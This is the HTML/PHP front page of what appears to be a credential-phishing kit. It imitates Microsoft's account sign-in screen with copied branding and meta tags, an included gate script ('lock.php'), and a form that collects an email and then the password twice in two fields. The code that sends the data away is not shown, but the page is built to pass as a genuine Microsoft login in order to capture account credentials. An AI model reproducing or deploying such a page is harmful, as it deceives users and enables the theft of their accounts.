<?php include "../../x/lock.php"; ?>
<html>
<head>
<title>Sign in to your Microsoft account</title>
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="1033">
<meta name="robots" content="none">
<meta name="PageID" content="i5030">
<meta name="SiteID" content="290950">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
<link href="./cs/style.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="./im/favicon.ico">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.0.min.js"></script>
<script src="./js/script.js"></script>
</head>
<body>
<div class="container">
    <div class="banner">
        <div class="disp">
            <form id="LOGIN">
                <ul>
                    <li><img src="./im/microsoft_logo.svg" alt="Microsoft"></li>
                    <ul class=" lg0 animated fadeIn" id="lg0"><i title="Back" class="bck"><img src="./im/arrow_left.svg" alt="Back"></i><p id="lgeml"> </p></li>
                </ul>
                <ul class="animated" id="lg1">
                    <li><h1>Sign in</h1></li>
                    <li class="err" id="err1"><p>Enter a valid email address, phone number, or Skype name.</p></li>
                    <li><input type="email" name="ofeml" class="inp" id="ofeml" autocomplete="off" placeholder="Email, phone, or Skype"></li>
                    <li><p>No account? <a href="#">Create one!</a></p></li>
                    <li><a href="#">Sign-in options</a></li>
                    <li style="text-align:right;"><button type="button" name="btn" class="btn" id="btn">Next</button></li>
                </ul>
                <ul class="animated slideIn" id="lg2">
                    <li><h1>Enter password</h1></li>
                    <li class="err" id="err2"><p id="erp">Please enter the password for your Microsoft account.</p></li>
                    <li><input type="password" name="ofpwd" class="inp animated" id="ofpwd" autocomplete="off" placeholder="Password"></li>
                    <li><input type="password" name="ofpwd1" class="inp animated" id="ofpwd1" autocomplete="off" placeholder="Password"></li>
                    <li><label class="check">Keep me signed in<input type="checkbox" class="chk"><span class="mark"></span></label></li>
                    <li><a href="#">Forgot my password</a></li>
                    <li style="text-align:right;"><button type="submit" name="sub" class="btn" id="sub">Sign in</button></li>
                </ul>
            </form>
        </div>
        <footer>
            <ul>
                <li>&copy;<?php echo date("Y"); ?> Microsoft</li>
                <li>Terms of use</li>
                <li>Privacy & cookies</li>
                <li><img src="./im/ellipsis_white.png" alt="white_ellipsis" id="el1"><img src="./im/ellipsis_grey.png" alt="grey_ellipsis" id="el2"></li>
            </ul>
        </footer>
    </div>
</div>
</body>
</html>